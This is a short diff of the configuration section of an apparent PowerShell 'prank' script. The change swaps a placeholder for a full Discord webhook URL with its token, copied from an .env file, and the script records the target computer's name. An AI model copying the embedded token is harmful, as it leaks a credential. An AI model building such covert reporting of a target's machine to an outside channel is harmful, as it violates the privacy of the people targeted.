@@ -6,7 +6,7 @@
 ####################################################################################################
 
 # --- Configuration -----------------------------------------------------------
-$webhookUrl  = 'REPLACE_ME'   # Discord webhook URL — set before deploying
+$webhookUrl  = 'https://discord.com/api/webhooks/1504979465015394407/vfGz6lp8QwdKt_6z_4AIcKefhRoCueEUh8gb3IioAwIzCJ9LB9WP2aC-HLKJ3c_2vabw'   # Discord webhook (#ghostsnitch-reports) — from DISCORD_WEBHOOK_GHOSTSNITCH in .env
 $prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
 $targetAlias = $env:COMPUTERNAME
 # -----------------------------------------------------------------------------
